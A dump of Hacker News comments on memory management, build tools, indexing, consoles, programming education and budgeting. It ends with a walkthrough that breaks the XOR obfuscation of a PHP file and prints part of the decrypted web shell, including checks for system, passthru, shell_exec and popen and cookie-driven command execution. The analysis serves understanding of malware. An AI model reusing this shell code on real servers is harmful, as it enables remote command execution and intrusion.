6880015,comment,6878565,6879573,9,0,barrkel,,,"No; the reasonable answer is to terminate and either log the failure or restart the process if it is critical.<p>Use process isolation to handle recovery from OOM situations if automated recovery is required.<p>A process that has run out of memory is likely in either of two situations; the process has an unfixed memory leak, or it is working with an input that is too large for the memory resources of the system it is running on, in which case it is likely thrashing. In both situations, the best way out is to terminate; in the former, regular restarts can still keep the system as a whole functional, in the latter, hanging on will just make sure the system keeps swapping.<p>In situations where it is not to restart, it&#x27;s better not to have dynamic memory allocation at all. But fault tolerance is generally a better strategy, see e.g. Erlang; systems should be designed so that processes can be restarted.",1386673132

6880012,comment,6878565,6879902,6,0,tenfingers,,,"That&#x27;s pretty much the same for GNU autotools, by the way.<p>Beyond the common platforms (linux, freebsd and <i>sometimes</i> cygwin), autotools break regularly, because they are not tested as well as on linux. Macros provided by libraries are even more prone to these issues.<p>I remember I had huge issues on IRIX to make even simple projects compile, so much that &quot;irixfreeware&quot; had an unsupported/patched automake that fixed some of these issues if you could have the luxury of re-generating the configure. Add to that that autotools broke backward compatibility of the configure.in scripts very often, and this is why debian has all versions of automake starting from 1.4 coexisting in the repository, and my patched automake was next to useless.<p>CMake is generally less painful if you learn it a bit. For the same level of underlying knowledge, CMake is way easier to &quot;fix&quot; when the build breaks, because it&#x27;s a <i>single</i> tool, with an API which is quite consistent and doesn&#x27;t involve a lot of magic. Fixing a configure failure with automake is hell by comparison. Fixing a Make failure with automake is also harder.<p>That being said, I generally dislike CMake. The syntax is just horrible (did they actually try to copy automake here?). The build system is still convoluted, and the output is basically unmodifiable. It doesn&#x27;t &quot;help&quot; you much in porting to other operating systems either, really, like you say.<p>For some people, CMake just provides a convenient way to build the software by exporting a VS project file. I would never recommend to export Xcode projects by contrast, since you can just as well use the normal Makefile approach on OSX.<p>Writing correct tests for feature discovery in automake is <i>very</i> hard. I cannot count the times some tests fail to properly detect an include/library/path because of a different compiler version and/or because the script writer tried to mess with CFLAGS/LDFLAGS. The same in CMake is saner on that front, at least.<p>But did I already say I don&#x27;t like CMake?",1386673078

6880004,comment,6879478,6879700,3,0,lloeki,,,"> <i>I don&#x27;t get why zero-indexing requires so much justification. Here are two powerful reasons [...]</i><p>Reasons which I feel are too C-like and high level already. The article falls into the same trap and says this as a counter argument:<p>> It’s not about * i = a + n * sizeof(x) because pointers and structs didn’t exist.<p>But I actually read this as an argument <i>in favor</i> of zero-based index origin: since pointers and structs <i>did not exist</i>, any form of memory addressing and data storing/retrieving had to be done at some lower level, and if you did it by hand, you will for sure align the start of your in memory handmade array-like structure at the address of it, then merely add to the register holding the address an offset maybe itself stored in a register, and certainly you would not add 1 again to those, because the idea would not even cross your mind to lose one and one byte/word of memory and one cycle, as it would just make no sense at that level.<p>Subsequently, C (or B or A or whatever) evolves the process and embeds into the language such arithmetics, abstracting it under monikers such as &quot;pointer&quot;, &quot;struct&quot; and &quot;array&quot; and adding utility functions like &quot;sizeof&quot;, so that you don&#x27;t have to remember if this or that CPU/asm uses ADD or ADL, or is foo-aligned, or uses bar calling convention.",1386672961

6880001,comment,6879825,6879825,6,0,georgemcbay,,,"Having to pay for multiplayer on the PS4 is somewhat unfortunate compared to not paying on the PS3, but the article really doesn&#x27;t do justice to what a great value PS+ is.  I was an Xbox 360 gamer for most of the last gen but did buy a PS3 later on to play The Last of Us and some other PS3 exclusives and ended up getting PS+ on that machine just because the free game offerings were ridiculously good, way better than the stuff Microsoft has been doing in response on Xbox Live (giving away super old games like Halo 3, Gears of War and Asssasin&#x27;s Creed 2 which most games who would be interested in already have).  I now own a PS4 and don&#x27;t mind the cost of PS+ because I&#x27;d be keeping my PS+ subscription active anyway.<p>Backward compatibility for consoles is rightly a thing of the past.  I don&#x27;t want companies to have to worry about making the hardware massively expensive (see: PS3) or reducing their ability to innovate by moving to new architectures.  If I want to play PS3 or Xbox 360 games, I still have my PS3 and Xbox 360.<p>That aside, I do agree with the gist of the article.<p>I&#x27;ve noticed a relatively recent trend where big companies have no problem releasing a new version of something missing massive amounts of functionality missing from the previous version.  I guess Final Cut Pro was one of the first big obvious instances of this, but it is happening all the time now from new consoles to Google&#x27;s Map app, to lots of other things, and it can sometimes be really infuriating as a user, especially as we move into a world (via SaaS, web apps, forced updates, etc) where the app ecosystem virtually forces you to upgrade things on a constant basis with no easy ability to keep using the old thing that worked better for you.",1386672934
6880000,comment,6878565,6879416,4,0,thaumaturgy,,,"15-odd years ago that was still a lingering point of debate in programming, before computers had lots of memory and disk to spare, so I eventually wrote my own memory manager for C++, since do-it-myself is my default approach to everything. At the time I was using a Metrowerks IDE, and surprisingly, my memory manager outperformed theirs by a fair bit (and allowed for some nifty debugging of other common problems, like memory leaks).<p>I set it up to support multiple heaps in the application, so that the application could have a heap for, say, network support, and a separate heap for something else. The memory manager used a modified best-fit algorithm and generally didn&#x27;t have problems with fragmentation. If the application ran out of memory in one heap, it wasn&#x27;t completely crippled -- a malloc error in the buffers heap wouldn&#x27;t prevent a dialog from being displayed from the UI heap.<p>It also had a &quot;reserve&quot; heap that could be made available to the application in particularly dire situations, and since the blocks in each heap grew towards the heap&#x27;s table, it had a function that could analyze and compress the table to squeeze a few more bytes out of the heap.<p>There was very little overhead and it worked nicely.",1386672905

We have similarly great residential Internet speeds and I think the article is wrong in attributing them to the sex industry. (I have no idea whether there are a significant number of similar businesses here in Sofia.)\nI think the net connection speeds are due to a combination of two factors: a very dense population (think 10-20 floor cheap residential towers from the times of socialism) a wildly unregulated market. The result was a zillion of small, very aggressive ISPs wiring up neighbourhoods with LAN cables for 5-10 EUR/month &quot;all our router can handle&quot; speeds (only international traffic is metered, national - where the torrent trackers and other torrent users are - is virtually at wire speed).",1386672774

Ever since good standards and moral values stopped being passed down from the majority of fathers and mothers (who rarely divorced back then by the way) things have been and will continue to get worse.

Frameworks can hide the confusing stuff and let you build functional things quickly, which is often great for motivation.<p>I do mostly agree with you though. The more directions I approach software development from (different languages, frameworks, platforms), the more understanding I have of the different layers. If you approach a project knowing that you <i>could</i> write the whole thing from scratch, but choose not to, when limitations inevitably bubble up in the framework you&#x27;re using it&#x27;s a lot easier to work around them than if you&#x27;re just copying and pasting stuff from tutorials without even understanding what the framework is trying to do.<p>Generally, though, programming skills are developed through practice, and practice requires motivation.

I think it&#x27;s more a lack of education. When you haven&#x27;t had money and your parents haven&#x27;t had money, then you don&#x27;t really know how to handle it.<p>It&#x27;s the same with family planning. Since having lots of kids is the norm, people don&#x27;t think much of it (not to mention that birth control is an extra expense for people already tight on cash.)<p>It&#x27;s not until someone can break out numbers, charts, graphs and help these people understand the basics of thriving in a modern economy that they will begin to make better choices.<p>Also, are people in the U.S. really that much different? How many people have the skills and discipline to properly plan for retirement or an emergency? Sure, many people are just scraping by. For many people in the middle class, their monthly budget just swells to eat up their pay. I remember a lot of friends right out of high school landing well paying labor jobs (while everyone else was poor and going to college) and blowing it all on trucks and big boy toys. This is an extreme example, but what percentage of high paid pro athletes go broke within 5 years after they quit playing? Big lotto winners?<p>Budgeting is one of those life tasks which can be very simple, but still difficult for many people. Time management is another. The brain sometimes has difficulty dealing with these abstract things. These people don&#x27;t do well unless you constrain them. Their budgets are constrained by what they bring home. Their time management is constrained by punching a clock and given specific tasks to do within certain times. Show up at X time. Take a lunch at X time. Leave at X time. In between, stand in X spot and deal with customers. Give them a vague job like running a business where they have to plan their own day and they would probably fall apart.",1386670836

Everyone who learns programming should start with something practical, ruby on rails, angular, whatever, but then go down the stack instead of sideways. Don&#x27;t add more and more frameworks, learn what&#x27;s beneath the framework. Learn what every layer in the system does, right down to the level of individual transistors on the cpu. There should be no magic anymore. If every part of the system is understandable (in theory) then any problem with it is solveable. Also, most frameworks become variations on a theme, and almost nothing is truly novel.<p>That last part is what made me almost quit programming, upon the realization that the industry was not on a long march of progression, but on a cycle of reinvention, where each generation rediscovers the knowledge of previous generations in different flavors, especially in software. If more people learned the fundamentals they could discern between that which is new and that which is novel and spend their time accordingly. The industry as a whole would be better off.",1386670743

You then XOR each 8 character substring with &quot;function&quot;, taking note of the position of the substring within the 12 character groupings, and count the resulting characters:-<p><pre><code>    $ ./4.pl 12 &quot;function&quot;\n    POS: 0: S->78 T->71 U->69\n    POS: 1: j->76 l->64 m->59\n    POS: 2: L->73 J->67 W->64\n    POS: 3: V->65 Q->55 P->49\n    POS: 4: m->68 v->50 `->49\n    POS: 5: E->54 C->52 O->48\n    POS: 6: 6->57 0->56 1->56\n    POS: 7: u->56 t->54 x->50\n    POS: 8: k->76 l->70 m->66\n    POS: 9: R->69 U->57 H->51\n    POS: 10: _->69 Y->62 ^->54\n    POS: 11: j->70 m->59 l->55\n</code></pre>\nNote that the correct key in each position is usually either the first or second possibility, but there are some times when it isn&#x27;t there at all.<p>(It&#x27;s better if you give it a longer string, if I give it &quot;function &quot; with the trailing space then it gets 9/12 as the most popular, 2/12 as second most popular and the remaining one as the third most popular. There are even better choices, see below, but I chose to go with this as it helps show how to continue with non-perfect information).<p>Next I knocked up a quick program to allow me to try different keys to decrypt it, it prints out the code in blocks of the appropriate keylength so it&#x27;s easy to see if a specific character position is correct or not. The program takes various commands from stdin (k = print key, S = set key, s = set individual key character, p = print in keylength sized blocks, P = print entire decrypted block):-<p><pre><code>    $ ./5.pl 12\n    k\n    key is aaaaaaaaaaaa\n    S SjLVmE6ukR_j\n    key is now SjLVmE6ukR_j\n    p\n    /)abjutt uy\n    stcm&vauiadl\n    es\\12i`(!Gisue\n    t(&quot;_UERQER/)\n    {$YCIOKNE= $\n    HTRPYCOHKIC_\n    VATS=$_WOSR=\n    &$NTRP_WOSR_\n    VATS=$_@ET;&\n    $HRTV_GBT_PA\n    RS=}\\12//cie&w\n    itn crrhr\n    `u\n    ncriin \\127_doe\n    ($k)}@hbadcr\n    (&#x27;NTRP/6.1&5\n    ...\n</code></pre>\nGetting there, but still a way off.

It&#x27;s k:-<p><pre><code>    s 4 k\n    k\n    key is SjJVkE6ukR_j\n    p\n    ...\n    elseif(oasYp\n    ...\n    COOKIE[#n]=\n    ...\n    system(#c)=}\n</code></pre>\nWe carry on doing this based on more clues like this (it gets easier and easier!) and we end up with:-<p><pre><code>    k\n    key is SjJVkE6rkRYj\n    p\n    //adjust sy\n    stem variabl\n    es\n    if(!@isse\n    t($_SERVER))\n    {$_COOKIE=&$\n    HTTP_COOKIE_\n    VARS;$_POST=\n    ...\n</code></pre>\nAnd printing out the entire decrypted buffer without extra linebreaks every 12 chars gives:-<p><pre><code>    P\n    \n    //adjust system variables\n    if(!@isset($_SERVER)){$_COOKIE=&$HTTP_COOKIE_VARS;$_POST=&$HTTP_POST_VARS;$_GET=&$HTTP_GET_VARS;}\n    //die with error\n    function x_die($m){@header(&#x27;HTTP/1.1 500 &#x27;.$m);@die();}\n    //check if we can exec\n    define(&#x27;has_passthru&#x27;,@function_exists(&#x27;passthru&#x27;));\n    define(&#x27;has_system&#x27;,@function_exists(&#x27;system&#x27;));\n    define(&#x27;has_shell_exec&#x27;,@function_exists(&#x27;shell_exec&#x27;));\n    define(&#x27;has_popen&#x27;,@function_exists(&#x27;popen&#x27;));\n    ...\n</code></pre>\nInterestingly, trying known plaintext of &quot;define&quot; gives us the entire key as the most probably choice first time:-<p><pre><code>    $ ./4.pl 12 &quot;define&quot;\n    POS: 0: S->75 X->56 _->54\n    POS: 1: j->77 a->51 f->47\n    POS: 2: J->71 A->55 F->49\n    POS: 3: V->61 ]->44 Z->43\n    POS: 4: k->59 h->43 *->40\n    POS: 5: E->55 8->48 4->44\n    POS: 6: 6->52 w->47 <->43\n    POS: 7: r->55 d->43 s->40\n    POS: 8: k->75 `->51 g->51\n    POS: 9: R->59 Y->55 X->49\n    POS: 10: Y->69 R->49 U->47\n    POS: 11: j->61 `->43 m->42</code></pre>",1386670709
